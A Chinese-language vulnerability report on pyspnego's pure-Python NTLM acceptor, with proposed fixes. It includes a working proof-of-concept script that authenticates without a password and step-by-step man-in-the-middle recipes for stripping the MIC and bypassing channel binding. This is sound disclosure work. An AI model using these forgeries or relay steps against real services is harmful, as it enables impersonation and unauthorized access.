# pyspnego NTLM 接收端信任边界分析

**报告编号**: security-125-analysis
**目标**: `pyspnego` 纯 Python NTLM 接收端（`NTLMProxy`，`usage="accept"`）以及在其之上组装的 SPNEGO / CredSSP 接收端
**代码版本**: `0.13.0.dev0`（仓库快照 `task/125`，提交 `46c844e`）
**分析日期**: 2026-11-17
**验证方式**: 静态代码审阅 + 在本仓库上实际运行协议级复现脚本（`security-125-repro.py`，见第 7 节）
**结论**: 当前接收端**只校验凭据，不校验信道绑定，也不校验 SPN/目标名**。在默认配置下这一点不仅是"削弱防护"，而是可以被利用到**无需口令完成认证**的程度。

---

## 0. 摘要

问题假设是：*若 NTLM 接收端只校验凭据而忽略信道绑定或 SPN 目标名，中继攻击就能借助合法认证穿过信任边界。*

分析结论是：**该假设在本代码库中成立，并且风险比假设更高**。原因有三层，按严重程度排列：

| # | 结论 | 严重度 | 关键位置 |
|---|---|---|---|
| C1 | 接收端在 NTLMv1/LM 分支上把**由攻击者提供的 client challenge 推导出的值**当作口令证明，任意 `8 字节 + Z(16)` 的 LM 响应即可通过认证，不需要口令 | 严重 | `src/spnego/_ntlm.py:593-622`、`src/spnego/_ntlm_raw/crypto.py:132-140` |
| C2 | 接收端要求信道绑定时，**未认证的 CHALLENGE 可被中间人改写**：删掉 `MsvAvTimestamp` 即可让客户端不发 MIC，再注入目标服务的 CBT 哈希，CBT 强制被完全绕过 | 严重 | `src/spnego/_ntlm.py:521-527`、`577-591` |
| C3 | `MsvAvChannelBindings == Z(16)` 被当作"匹配任意绑定"的通配符；而真实 Windows / gss-ntlmssp 客户端在未配置 CBT 时**正是发送 Z(16)** | 高 | `src/spnego/_ntlm.py:587` |
| H1 | 信道绑定检查只存在于 NTLMv2 分支；NTLMv1 或仅 LM 响应路径完全不检查 CBT | 高 | `src/spnego/_ntlm.py:567-611` |
| H2 | MIC 的"是否校验"由**客户端自己声明的 `MsvAvFlags.mic`** 决定；删掉 MIC 字段后接收端直接跳过校验 | 高 | `src/spnego/_ntlm.py:590-591`、`632-637` |
| H3 | 协商后的上下文属性直接取 AUTHENTICATE 里客户端写的 flags；中间人清掉 SIGN/SEAL 后，`unwrap()` 会接受攻击者构造的数据（ALWAYS_SIGN 的常量签名） | 高 | `src/spnego/_ntlm.py:639`、`863-878` |
| M1 | `MsvAvTargetName` 在接收端**从未被读取或比较**；`AvFlags.untrusted_spn` 也未处理 | 中 | `src/spnego/_ntlm.py:548-641`（全文无引用） |
| M2 | 逐次 `step(channel_bindings=...)` 在纯 NTLM 接收端的第一步被静默丢弃；`new_context()` 不继承逐次绑定 | 中 | `src/spnego/_ntlm.py:478-492`、`355-373`；`src/spnego/_negotiate.py:132-140` |
| M3 | `GssChannelBindings()` 空对象映射到一个固定的公开常量哈希；接收端没有地址绑定、没有恒定时间比较、重复 AV 对"后者覆盖" | 中/低 | `src/spnego/channel_bindings.py:120-128`；`src/spnego/_ntlm_raw/messages.py:956-989` |

一句话总结两者如何影响信任结论：

- **信道绑定**本应是"这次认证绑定在那条 TLS 通道上"的证明。当前实现里，接收端只在"调用方显式传入了 CBT 且客户端走了 NTLMv2"时才做一次哈希比对，而该比对依赖的输入（CHALLENGE）和开关（是否有 `MsvAvTimestamp`/MIC）都在未认证的报文里，因此它**不改变**信任结论。
- **SPN/目标名**本应是"这次认证是发给这个服务实例的"的证明。当前接收端完全不读取 `MsvAvTargetName`，也从不拿它与自身 `spn` 比较，因此接收端对"认证被转发给了另一个服务"这件事**不可见**。

---

## 1. 分析范围与方法

### 1.1 范围

- `spnego.server(..., protocol="ntlm", options=NegotiateOptions.use_ntlm)` 所创建的 `NTLMProxy(usage="accept")`；
- `spnego.server(..., protocol="negotiate")` 在 Linux/无 gss-ntlmssp 时回退到的 `NegotiateProxy` + `NTLMProxy`；
- `spnego.server(..., protocol="credssp")` 的内层 Negotiate 上下文（仅限与 CBT 相关的部分）；
- 作为对照：`SSPIProxy` / `GSSAPIProxy` 把校验交给系统实现，不在此报告的漏洞范围内（见 5.2）。

### 1.2 方法

1. 静态审阅接收端全部状态机：`_step_accept_negotiate`、`_step_accept_authenticate`、`_compute_response`、`verify`/`unwrap`。
2. 审阅 CBT 数据模型（`GssChannelBindings`）、SPN 数据模型（`ContextProxy.spn`）、AV 对解析（`TargetInfo`）。
3. 构造协议级复现：自行拼装 `NEGOTIATE`/`AUTHENTICATE`，或在中间人位置改写 `CHALLENGE`/`AUTHENTICATE`，观察接收端结论。
4. 全量测试套件作为基线：`PYTHONPATH=src python3 -m pytest tests/ -q` → **580 passed, 82 skipped**。即现有测试不覆盖本报告的问题。

### 1.3 威胁模型

- 攻击者能完整控制客户端与目标服务之间的报文（典型中继/中间人 ABA）。
- 攻击者**不知道**用户口令；可能知道用户名/域名（可枚举，或来自目标服务自身）。
- 攻击者知道目标服务的 TLS 证书（公钥信息本就是公开的），因此能自行算出目标服务的 CBT 哈希。
- 客户端是"诚实但未配置 CBT"的普通客户端（这是最常见形态，见 5.4 的真实抓包）。

---

## 2. 接收端的信任判定链（代码事实）

所有引用均指本仓库当前快照。

### 2.1 第一步：`NEGOTIATE` → `CHALLENGE`

`src/spnego/_ntlm.py:494-546`：

```python
server_challenge = os.urandom(8)
target_name = to_text(socket.gethostname()).upper()          # :521
target_info[AvId.nb_computer_name] = target_name             # :524
target_info[AvId.nb_domain_name] = "WORKSTATION"             # :525
target_info[AvId.dns_computer_name] = to_text(socket.gethostname())  # :526
target_info[AvId.timestamp] = FileTime.now()                 # :527
```

要点：

- `CHALLENGE` 里**没有** `MsvAvChannelBindings`，这符合协议（CBT 是客户端回显）；
- `TargetName` 字段与 `DnsComputerName` 来自 `socket.gethostname()`，与调用方传入的 `hostname`/`service`（即 `self.spn`）**无关**；
- 整个 `CHALLENGE` **没有任何完整性保护**。NTLM 中只有 AUTHENTICATE 的 MIC 能覆盖 `NEGOTIATE+CHALLENGE+AUTHENTICATE` 三元组，而是否发 MIC 由客户端在看到挑战后自行决定。这是 C2 的根因。

### 2.2 第二步：`AUTHENTICATE` → 接收端判定

`src/spnego/_ntlm.py:548-641`。去除注释后的判定顺序：

```python
# 1) 匿名检查（注意：与 b"\x00" 这一 1 字节常量比较）
if not auth.user_name or (not auth.nt_challenge_response and
        (not auth.lm_challenge_response or auth.lm_challenge_response == b"\x00")):
    raise OperationNotAvailableError(...)                    # :556-559

# 2) 从本地凭据库取该用户的哈希（credential 由报文里的用户名决定）
self._credential = _NTLMCredential(CredentialCache(username=username))  # :564

if auth.nt_challenge_response and len(auth.nt_challenge_response) > 24:  # :567  NTLMv2 分支
    ...
    if channel_bindings:                                     # :579
        if AvId.channel_bindings not in target_info:         # :580-583
            raise BadBindingsError(...)
        expected_bindings = target_info[AvId.channel_bindings]        # :585
        actual_bindings = md5(channel_bindings.pack())                # :586
        if expected_bindings not in [actual_bindings, b"\x00"*16]:    # :587  ← 通配符
            raise BadBindingsError(...)

    if target_info.get(AvId.flags, 0) & AvFlags.mic:         # :590  ← 客户端自述
        expected_mic = auth.mic                              # :591
else:
    # NTLMv1 / LM 分支 —— 这里完全没有 channel_bindings 逻辑
    if not self._nt_v1: ...                                  # :594-595
    elif not auth.nt_challenge_response and not self._lm: ...# :597-598
    client_challenge = b"\x00" * 8                           # :600
    if auth.flags & NegotiateFlags.extended_session_security:# :601
        client_challenge = (auth.lm_challenge_response or b"\x00"*8)[:8]  # :602 ← 攻击者输入
    expected_nt, expected_lm, key_exchange_key = compute_response_v1(...)  # :604-611

# 3) 凭据比对
if auth.nt_challenge_response:
    auth_success = auth.nt_challenge_response == expected_nt  # :616
elif auth.lm_challenge_response:
    auth_success = auth.lm_challenge_response == expected_lm  # :619  ← C1
if not auth_success: raise InvalidTokenError(...)             # :621-622

# 4) MIC（仅当客户端声明过）
if expected_mic:                                             # :632
    ...
    if actual_mic != expected_mic: raise InvalidTokenError(...)# :636-637

self._context_attr = auth.flags                              # :639  ← H3
self._complete = True                                        # :640
```

**接收端在这段代码里读过的客户端数据只有**：`user_name`、`domain_name`、NT/LM 响应、`MsvAvChannelBindings`、`MsvAvFlags`（仅 mic 位）、`auth.mic`、`auth.flags`。

**没有被读取的**：`MsvAvTargetName`、`AvId.channel_bindings` 之外的地址绑定、`AvFlags.untrusted_spn`、`AvFlags.constrained`、NTLMv2 时间戳的时效性、`NEGOTIATE` 与 `AUTHENTICATE` 的 flags 一致性。

---

## 3. 信道绑定如何影响（或不影响）信任结论

### 3.1 只有"调用方传入 + 客户端走 NTLMv2"时才会检查

- 若 `spnego.server(...)` 未传 `channel_bindings`，接收端**不做任何绑定检查**（`if channel_bindings:` 直接跳过）。此时认证结论 = "知道该用户口令即可"，与连接、通道、服务无关。
- 若传了 `channel_bindings`，检查只在 `:567` 的 NTLMv2 分支内。NTLMv1 或"只有 LM 响应"的 AUTHENTICATE 会走 `else` 分支，**完全不检查 CBT**。实测（F5）：一个 `LM_COMPAT_LEVEL=0` 的客户端配上**不匹配**的 CBT，接收端仍然 ACCEPTED。

### 3.2 `Z(16)` 通配符（C3）

`:587`：

```python
if expected_bindings not in [actual_bindings, b"\x00" * 16]:
```

任何 16 字节全零的 `MsvAvChannelBindings` 都被视为匹配。这一行为的来源可以在本仓库自带的抓包文档中直接看到 —— 真实客户端在"未配置 CBT"时发送的就是 Z(16)：

- `docs/scenarios/sspi_ntlm.md:205-206`（Windows SSPI 客户端）
- `docs/scenarios/gssapi_ntlm.md:192-193`（gss-ntlmssp 客户端）
- `docs/scenarios/sspi_ntlm_invalid_spn.md:205-206`、`docs/scenarios/heimdal_macos_ntlm.md:252`、`docs/scenarios/gssapi_negotiate_ntlm_fallback.md:291` 等

也就是说，**接收端把"我没有绑定"当成了"我匹配你的绑定"**。如果某个部署依赖 `spnego.server(channel_bindings=...)` 来阻止中继，它挡住的只是"完全不发 AV 对"的客户端，挡不住任何会发 Z(16) 的合法客户端实现 —— 而中继者恰恰可以要求/诱导受害者客户端发送 Z(16)（例如受害者客户端只是没配 CBT，或甚至由攻击者自己构造）。实测（F4）：客户端哈希为 Z(16)、目标是任意非零哈希 → ACCEPTED。

### 3.3 强制绑定的完整绕过（C2）

即使接收端严格拒绝 Z(16)（把它删掉），当前实现仍然可被绕过，因为"是否要求 CBT"和"是否已有 TIMESTAMP"都由**可被改写的 CHALLENGE** 决定：

1. 中间人把接收端 CHALLENGE 中的 `MsvAvTimestamp` 与 `MsvAvFlags` 删除；
2. 客户端（`src/spnego/_ntlm.py:941-945`）看到没有 timestamp 就**不设置** `self._mic_required`，于是既不设置 `MsvAvFlags.mic`，也不生成 MIC；
3. 中间人把目标服务的 CBT 哈希写入 CHALLENGE（目标 TLS 证书是公开信息，哈希可自行计算）；
4. 客户端按收到的 CHALLENGE 原样计算 `TargetInfo`，于是回显出正确的 CBT 哈希，但**没有 MIC**；
5. 接收端在 `:585-587` 比对成功，`:590` 因客户端没声明 mic 而跳过 MIC 校验 → **ACCEPTED**。

实测（F3）：

```
echoed CBT equals the target's expectation: True
client MIC after the rewrite: 00000000000000000000000000000000
-> ACCEPTED
```

对照组：如果不删 timestamp（MID 注入 CBT 但不压制 MIC），客户端的 MIC 会覆盖被改写的 CHALLENGE → 接收端报 `Invalid MIC`。这恰好说明 **MIC 是当前唯一能保护 CHALLENGE 的机制，而它的启用权掌握在可被改写的 CHALLENGE 手里** —— 循环依赖。

### 3.4 检查顺序把错误类型暴露给了未认证的对端

`:579-588` 的 CBT 检查位于 `:613-622` 的凭据校验之前。实测：错误口令 + 缺失 CBT → `BadBindingsError`；错误口令 + 无 CBT 要求 → `InvalidTokenError`。攻击者可据此区分"该服务是否启用 CBT"，从而选择攻击路径（见 6.3 的协议指纹）。

---

## 4. 目标名 / SPN 如何影响信任结论

### 4.1 客户端会写，接收端从不读

客户端在 NTLMv2 响应中写入：

```python
target_info[AvId.target_name] = self.spn or ""      # src/spnego/_ntlm.py:951
```

`self.spn` 来自 `ContextProxy.__init__`：

```python
self.spn = to_text("%s/%s" % (service if service else "HOST", hostname or "unspecified"))  # _context.py:286-288
```

而接收端的 `_step_accept_authenticate`（`:548-641`）**没有任何一行**引用 `AvId.target_name` 或 `self.spn`。实测（F6）直接对源码做字符串检查：

```
acceptor reads AvId.target_name: False
acceptor reads AvFlags.untrusted_spn: False
acceptor reads AvId.timestamp: False
```

因此：

- 客户端声明"我要访问的是 `MSSQLSvc/totally-different-host`"，接收端声明自己是 `HTTP/target`，握手依然 ACCEPTED；
- 接收端也无法区分"这次认证是发给本服务的"还是"被转发给同主机上另一个服务的"；
- `AvFlags.untrusted_spn`（服务端告诉客户端"这个名字来自不可信来源"）在接收端被完全忽略，虽然 `AvFlags.untrusted_spn` 已在 `messages.py:146` 定义。

### 4.2 为什么"SPN 检查"本身不是信道绑定

需要明确区分，避免给出错误的修复承诺：

- `MsvAvTargetName` 是**操作目标**的声明，位于客户端计算出的 NTLMv2 blob 内，受 MIC 保护（若 MIC 存在）；它**不**绑定 TLS 通道、**不**绑定连接实例。
- 没有 CBT 时，NTLM 认证是可中继的（Pass-the-Hash 之外还有 NTLM relay）。SPN 校验只能把"任意服务"收窄为"这个 SPN 下的服务"，无法阻止把认证转发给**使用同一 SPN/同一服务账号**的另一实例。
- 因此修复建议中，SPN 校验只能作为**纵深防御层**，CBT（或 EPA/Extended Protection）才是通道绑定层。这一点必须在报告中写清楚，否则会误导部署方认为"加了 SPN 检查就安全了"。

### 4.3 接收端自身身份与 SPN 不一致带来的次生问题

- `CHALLENGE` 的 `TargetName`/`DnsComputerName` 固定取 `socket.gethostname()`（`:521`、`:526`），`NbDomainName` 固定为 `"WORKSTATION"`（`:525`）。在容器、反代、集群、或通过别名/负载均衡访问时，这个身份与客户端请求的 SPN 不一致。
- 对**严格校验**的客户端（例如 Windows 的 "Server SPN target name validation level" 策略、或 gss-ntlmssp 的 `--spn` 校验）而言，接收端广播的 `MsvAvTargetName` 会触发客户端侧拒绝，形成"接收端越宽松、客户端越容易报错"的不对称行为。
- 本仓库 `docs/scenarios/sspi_ntlm_invalid_spn.md` 记录的正是这类场景。

---

## 5. 版本与配置差异留下的风险

### 5.1 版本维度（仅限本仓库可核实的事实）

本仓库为单提交快照（`git log` 只有 `46c844e`），无法逐版本 diff。可核实的版本信息：

| 版本 | 与接收端信任相关的变更 | 对本报告结论的影响 |
|---|---|---|
| `0.13.0.dev0`（本快照） | — | 全部问题存在 |
| `0.12.4` | 修复 SSPI 接收端 UPN 凭据、SPNEGO 接收端 OID 回显、`DnsComputerName` 改用 `gethostname()`、`negotiated_protocol`/`session_key` 行为 | 与本报告问题无关；`DnsComputerName` 的改动让接收端身份更脱离调用方配置的 SPN（4.3） |
| `0.12.3` | 修复接收端 `CHALLENGE` 的 `Version` 字段偏移 | 修复前严格客户端会解析失败（fail-closed），修复后可用性提升、但信任问题一并未变 |
| ≤ `0.12.2` | 无任何接收端 CBT/SPN 校验相关变更 | 本报告的接受逻辑在可见历史中从未被收紧 |

`CHANGELOG.md` 中没有任何一条声称接收端强制执行信道绑定或 SPN 校验。需要说明：本报告**未**与发布版 tarball 逐行比对（环境无外网），上述"版本维度"仅基于本仓库代码、CHANGELOG 与文档；如用于合规结论，建议在取得发布包后对 `_ntlm.py:548-641` 做同样的复核。

### 5.2 Provider 维度（决定是否暴露风险）

`src/spnego/auth.py:20-95` 的选择顺序：`credssp` → `use_sspi`/Windows SSPI → `use_gssapi`/Kerberos + gssapi → `use_negotiate` → `use_ntlm`。

- **Windows 上默认走 `SSPIProxy`**（`_sspi.py`），CBT 与 SPN 由微软 SSPI 实现处理（`_sspi.py:271-278` 把 `SecChannelBindings` 作为 `SECBUFFER_CHANNEL_BINDINGS` 传入；`:297` 传入 `target_name`）。本报告的接收端漏洞**不适用**于该路径。
- **Linux / 无 gss-ntlmssp 时**，`protocol="ntlm"` 与 `protocol="negotiate"`（回退）都落到 `NTLMProxy`。这是本报告实际影响的部署形态，也是大量自动化/CICD/测试环境的形态。
- 显式 `options=NegotiateOptions.use_ntlm` 会在任何平台强制使用该实现（`_negotiate.py:471-474` 亦如此）。

> 结论：风险不是"所有 pyspnego 用户都中招"，而是"凡是把纯 Python NTLM 接收端当作安全边界的地方都中招"。

### 5.3 配置维度：`LM_COMPAT_LEVEL` 是决定性的

`src/spnego/_ntlm.py:284-306`：

```python
lm_compat_level = int(os.environ.get("LM_COMPAT_LEVEL", 3))
...
else:                                  # 接收端
    self._lm    = lm_compat_level < 4
    self._nt_v1 = lm_compat_level < 5
    self._nt_v2 = True
```

| 接收端 `LM_COMPAT_LEVEL` | 接受 LM 响应 | 接受 NTv1 | C1（无口令伪造） | H1（v1 无 CBT） |
|---|---|---|---|---|
| 未设置（默认 3） | 是 | 是 | **可利用** | **可利用** |
| 0/1/2 | 是 | 是 | **可利用** | **可利用** |
| 4 | 否 | 是 | 不可利用 | 仍可利用（NTv1） |
| 5 | 否 | 否 | 不可利用 | 不可利用 |

实测（F1 与 6.2 的矩阵）：默认配置下伪造的 `LM = <8 任意字节> || Z(16)` 对凭据库中的**任意账号**都 ACCEPTED；只有把接收端设到 `4`/`5` 才能挡住。

注意 `LM_COMPAT_LEVEL=0` 对**客户端**还会清掉 `extended_session_security`（`:290-291`），因此攻击者也可以把受害客户端降级到 NTLMv1 —— 但攻击者其实不必：见 6.1，直接伪造即可。

### 5.4 客户端维度：合法客户端默认会发 Z(16)

如 3.2 所述，仓库自带的真实抓包显示 Windows SSPI、gss-ntlmssp、Heimdal 在"未配置 CBT"时均发送 Z(16)。这意味着：

- 部署方若只是"在服务端传入 CBT"而不控制客户端，则 **拦截不了这些客户端**；
- 反过来，若部署方为了通过检查而让客户端发送 Z(16)，等于把 3.2 的通配符变成常态化。

### 5.5 逐次绑定与上下文派生

- `NTLMProxy._step_accept`（`:478-492`）只把 `channel_bindings` 传给**第二个**（Authenticate）步骤；在第一步传入会被丢弃。实测（F9）：只在第一步传 CBT → 客户端不发 CBT → 仍然 ACCEPTED。这与 `ContextProxy.step` 文档中"逐次绑定优先"的语义（`_context.py:471-473`）不一致，属于**静默 fail-open**。
- `NTLMProxy.new_context()`（`:355-373`）只复制 `self.channel_bindings`，不复制逐次绑定。若服务端采用"模板上下文 + 每连接 `new_context()`"的常见写法，逐次绑定必然丢失。
- `NegotiateProxy.new_context()`（`_negotiate.py:132-140`）同样只复制 ctor 绑定；实测构造后的内部 NTLM 上下文 `channel_bindings is None`。
- `CredSSPProxy.step()`（`_credssp.py:356-370`）接受 `channel_bindings` 参数但**从不使用**；`_step_accept`（`:476-478`）创建内层 `spnego.server(protocol="negotiate")` 时也未传绑定。CredSSP 自身用 TLS 公钥绑定（`:503-505` 的 `_get_pub_key_auth` 比对）来抵御 MITM，因此这不是主漏洞，但"传入的 CBT 被忽略"属于误导性 API。

---

## 6. 逐项证据

> 全部结果来自 `security-125-repro.py`（第 7 节）。`ACCEPTED` 表示接收端 `complete=True` 并给出 `client_principal`。

### 6.1 C1：无口令认证伪造（最严重）

做一个诚实客户端都做不到的报文：NT 响应为空，LM 响应为 `8 字节攻击者选择值 + 16 字节零`，`AUTHENTICATE.flags` 置 ESS 位。

```
=== F1 ===
  LM response = <8 attacker bytes> || Z(16), NT response absent
  -> ACCEPTED | client_principal = PROBE\probeuser

=== F1b ===
  -> ACCEPTED | client_principal = OTHER\otheruser
```

成因链：

1. `:601-602`：`client_challenge = auth.lm_challenge_response[:8]` —— 取自攻击者；
2. `crypto.py:132-134`：ESS 下 `lm_response = client_challenge + Z(16)`、`nt_response` 由 NT 哈希算 DES；
3. `:618-619`：没有 NT 响应时，`auth_success = auth.lm_challenge_response == expected_lm`；
4. 而 `expected_lm` 完全由第 1 步的输入决定 → 恒等成立。

同样成立的还有 `LM = Z(24)`（真实客户端在"要求 MIC"时正是发送 Z(24)，见 `:960-961`），以及 `LM = <8 字节> || Z(16)` 的任意变体。1 字节 `b"\x00"` 被 `:556-559` 的匿名检查拦下，但这只是长度碰巧不等 —— 该检查把 24 字节值与 1 字节常量比较，本身也是缺陷（`b"\x00"*24 == b"\x00"` 为 `False`，实测已确认）。

攻击者需要知道的仅是"凭据库里存在的用户名"（可枚举）。CBT、SPN 在此路径上完全没有参与 —— 即使部署方"已经配了 CBT"，实测（6.2 矩阵、F1b 换账号）仍然成功。

### 6.2 C1 的配置矩阵

以伪造 `LM = <8 字节> || Z(16)` 攻击**要求 CBT** 的接收端：

```
 acceptor LM_COMPAT_LEVEL | result
   None   | ACCEPTED as PROBE\probeuser
   0      | ACCEPTED
   1      | ACCEPTED
   2      | ACCEPTED
   3      | ACCEPTED
   4      | rejected (Acceptor settings are set to reject LM responses)
   5      | rejected (Acceptor settings are set to reject NTv1 responses)
```

### 6.3 C2 / H2：MIC 与 CHALLENGE 完整性

```
=== F2 ===
  acceptor challenge carries MsvAvTimestamp: True
  client really sent a MIC: True
  MITM removes the MIC field: ACCEPTED
```

成因：`:590-591` 的 `expected_mic = auth.mic`。当攻击者把 AUTHENTICATE 中的 16 字节 MIC 字段整体删除（同时修正 6 个 payload offset），`auth.mic` 为 `None`，`:632` 的 `if expected_mic:` 为假 → 跳过。接收端没有"如果客户端声明了 MIC / 如果我的 CHALLENGE 带 timestamp，则 MIC 必须存在"这一必要条件。

### 6.4 C2：CBT 强制绕过（完整链路）

```
=== F3 ===
  echoed CBT equals the target's expectation: True
  client MIC after the rewrite: 00000000000000000000000000000000
  -> ACCEPTED
```

### 6.5 H3：协商属性被客户端控制 → 会话完整性丢失

```
=== F7 ===
  acceptor asked for integrity+confidentiality, negotiated: 0

=== F8 ===
  acceptor context_attr: 0
  unwrap() with the constant ALWAYS_SIGN signature: accepted b'...'
```

成因：`:639` 直接 `self._context_attr = auth.flags`；`:624-627` 的会话密钥派生也依据 `auth.flags`。攻击者清掉 `NEGOTIATE_SIGN|NEGOTIATE_SEAL` 后：

- `sign()`（`_ntlm_raw/security.py:67-72`）在 `always_sign` 仍未清除时返回常量 `b"\x01" + Z(15)`；
- `verify()`（`:863-878`）用同一个常量比较并通过 → **攻击者可用固定 16 字节签名提交任意密文**，`unwrap()` 返回"认证通过"的明文。

这就是"中继之后还能继续篡改应用数据"的路径。需要说明：由于此时 RC4 流仍然存在且接收端解密是流式的，攻击者不能让任意明文按位精确出现（需要知道 keystream）；但接收端**不再能证明数据来自持钥方**，任何按该常量签名提交的数据都会被当作合法。对使用 `unwrap()` 返回值做授权/审计的上层应用，这是完整性失效。

### 6.6 H1 / C3：分支与通配符

```
=== F4 ===   客户端 CBT 哈希 = Z(16)，目标期望 = 4b77… → ACCEPTED
=== F5 ===   NTLMv1 客户端 + 不匹配 CBT → ACCEPTED
             仅 LM 响应 + 无 CBT AV 对 → ACCEPTED
```

### 6.7 M1：SPN 不参与判定

```
=== F6 ===
  client target_name: 'MSSQLSvc/totally-different-host' | acceptor spn: HTTP/target
  handshake: ACCEPTED
```

### 6.8 M2 / M3

```
=== F9 ===   CBT 只传给第一步 → ACCEPTED（静默丢弃）
=== F10 ===  md5(GssChannelBindings().pack()) = 441018525208457705bf09a8ee3c1093
             Z(16)                            = 0000…0000
```

补充的静态事实：

- `TargetInfo.unpack`（`messages.py:956-989`）对重复 AV 对采用"后者覆盖"且不报错：`MsvAvChannelBindings = AA*16` 后跟 `BB*16`，最终取 `BB`（实测）。接收端取 `target_info[AvId.channel_bindings]`，因此"先合法后恶意"与"先恶意后合法"两种顺序会得到不同结论，解析器与校验器对"取哪一个"没有共同约定。
- 所有凭据/CBT/MIC 比较使用 `==` / `in`（`:587`、`:616`、`:619`、`:636`、`:875`），非恒定时间。
- 接收端不校验 NTLMv2 时间戳的时效（`nt_challenge.time_stamp` 被原样代入计算），因此"过期捕获"只在服务端 challenge 变化时才失效；同一 challenge 内没有时间窗控制。

---

## 7. 复现方式（可复核）

### 7.1 一键复现

仓库根目录已附 `security-125-repro.py`（纯 Python，无外部服务）：

```bash
PYTHONPATH=src python3 security-125-repro.py
```

它会临时创建 `NTLM_USER_FILE`（两个账号），然后在同一进程内完成协议交互。预期输出（节选，实际每次的随机字节不同）：

```
=== F1  forged AUTHENTICATE without knowing any password ===
  LM response = <8 attacker bytes> || Z(16), NT response absent
  -> ACCEPTED | client_principal = PROBE\probeuser
=== F1b ...
  -> ACCEPTED | client_principal = OTHER\otheruser
=== F2 ...
  client really sent a MIC: True
  MITM removes the MIC field: ACCEPTED
=== F3 ...
  echoed CBT equals the target's expectation: True
  client MIC after the rewrite: 00000000000000000000000000000000
  -> ACCEPTED
=== F4 ... -> ACCEPTED
=== F5 ... -> ACCEPTED / ACCEPTED
=== F6 ... handshake: ACCEPTED
       acceptor reads AvId.target_name: False
=== F7 ... negotiated: 0
=== F8 ... unwrap() with the constant ALWAYS_SIGN signature: accepted ...
=== F9 ... ACCEPTED
=== F10 ... md5(GssChannelBindings().pack()) = 4410185...
```

### 7.2 最小手工复核（F1，10 行）

```python
import os, spnego
from spnego._ntlm_raw.messages import Authenticate, Negotiate, NegotiateFlags
open("/tmp/c.creds","w").write("CORP:alice:Whatever!\n")
os.environ["NTLM_USER_FILE"]="/tmp/c.creds"; os.environ.pop("LM_COMPAT_LEVEL", None)
F = int(NegotiateFlags.unicode|NegotiateFlags.oem|NegotiateFlags.ntlm|NegotiateFlags.request_target
        |NegotiateFlags.always_sign|NegotiateFlags.extended_session_security|NegotiateFlags.sign
        |NegotiateFlags.seal|NegotiateFlags.key_128|NegotiateFlags.key_56)
s = spnego.server(protocol="ntlm", options=spnego.NegotiateOptions.use_ntlm)
s.step(Negotiate(F).pack())
s.step(Authenticate(flags=F, lm_challenge_response=b"12345678"+b"\x00"*16,
                    nt_challenge_response=None, domain_name="CORP", username="alice").pack())
print(s.complete, s.client_principal)   # True CORP\alice
```

（已在本环境执行，输出为 `True CORP\alice`。）

### 7.3 现有测试为何没有发现

`tests/test_ntlm.py:453-496` 的 `test_ntlm_bad_bindings` 只覆盖两种 NTLMv2 情形："没发 AV 对"与"发了不匹配的 16 字节"。它**没有**覆盖：

- 发 Z(16)；
- NTLMv1/LM 分支；
- 改写 CHALLENGE 抑制 MIC；
- 删除 MIC 字段；
- 无口令伪造 LM 响应；
- SPN/`MsvAvTargetName`；
- 逐次绑定与 `new_context()`。

因此 `580 passed` 不能作为"接收端信任边界正确"的证据。

---

## 8. 修复建议（可复核、可分阶段落地）

以下建议按"是否能独立阻断 6.1-6.5"排序。所有建议都应配套第 9 节的测试。

### R1【必须】不再把 LM 响应当作身份证明

位置：`src/spnego/_ntlm.py:613-622`。

```python
# 现在
if auth.nt_challenge_response:
    auth_success = auth.nt_challenge_response == expected_nt
elif auth.lm_challenge_response:
    auth_success = auth.lm_challenge_response == expected_lm
```

理由：ESS 下的 LM 响应就是 `ClientChallenge || Z(16)`（`crypto.py:132-134`），不含任何口令派生材料；用 `expected_lm` 比较等价于"比较攻击者的输入与攻击者的输入"。

建议：**只用 NT 响应做认证**（LM 响应仅用于派生 `kxkey`）；`auth_success` 仅由 `nt_challenge_response == expected_nt` 决定。若必须保留 LMv1 兼容，需显式 opt-in 开关（如 `NegotiateOptions.allow_ntlm_v1_auth`）且默认关闭，并在拒绝路径返回统一错误，避免泄露分支信息。

同时修正 `:556-559` 的匿名判定：

```python
if not auth.user_name or not any([auth.nt_challenge_response, auth.lm_challenge_response]):
    raise OperationNotAvailableError(...)
```

（当前的 `== b"\x00"` 是指与 1 字节常量比较，实测 `b"\x00"*24 != b"\x00"`。）

### R2【必须】MIC 成为强制项，而不是"客户端声明才校验"

位置：`src/spnego/_ntlm.py:590-591`、`632-637`；`_step_accept_negotiate:527`。

建议逻辑：

```python
challenge_had_timestamp = AvId.timestamp in challenge.target_info
claimed_mic = bool(target_info.get(AvId.flags, 0) & AvFlags.mic)

if challenge_had_timestamp or claimed_mic:
    if auth.mic is None:
        raise InvalidTokenError(context_msg="MIC required but not present")
    ...  # 计算并比较
```

要点：**只要服务端自己的 CHALLENGE 带 `MsvAvTimestamp`（当前实现总是带），就必须有 MIC**。这样攻击者删 timestamp 会与"服务端记得自己发过 timestamp"矛盾。若将来允许关闭 timestamp，则必须由配置显式声明，且不能由报文中的 `AvFlags.mic` 决定是否校验。

### R3【必须】把 CHALLENGE 纳入完整性保护，或至少校正其可篡改性

NTLM 协议本身无法保护未被 MIC 覆盖的 CHALLENGE，因此工程上的正确做法是：

- 把 R2 落地（服务端总是要求 MIC）；
- 在 `step()` 中保存本端发出的 `NEGOTIATE`/`CHALLENGE` 原始字节，**只**用保存的副本参与 MIC 计算（当前 `:634` 已经是这样做的，`negotiate.pack()`/`challenge.pack()`），并记录"本端挑战是否包含 timestamp/CBT 期望"用于 R2 判定；
- 在文档与 API 中明确：**没有 CBT 的 NTLM 不能作为安全边界**，中继是其固有属性，而非实现缺陷。

### R4【必须】取消 Z(16) 通配符，并让"未绑定"与"绑定到目标"可区分

位置：`src/spnego/_ntlm.py:587`。

```python
if expected_bindings != actual_bindings:
    raise BadBindingsError(...)
```

配套：

- 对"必须要求 CBT"的部署，新增显式策略（例如 `NTLMProxy(..., require_channel_bindings=True)` 或 `NegotiateOptions.require_cbt`），语义为"缺失或 Z(16) 一律拒绝"；
- 保留"可选 CBT"模式时，缺失 AV 对仍可接受（兼容旧客户端），但 Z(16) 不应被当作"匹配"；至少应在返回的上下文属性/日志中标记 `cbt_present=False`，让上层能做出授权决策；
- `GssChannelBindings()` 空对象不应产生一个有意义的"期望哈希"（`4410185...`）：若 `application_data` 与地址全为空，应在构造/接收端显式拒绝并提示"空绑定不是绑定"。

> 兼容性提示：取消 Z(16) 通配符会让"未配置 CBT 的 Windows/gss-ntlmssp 客户端"在 `require_cbt=True` 下被拒绝，这是**预期行为**；必须通过发布说明明确告知。

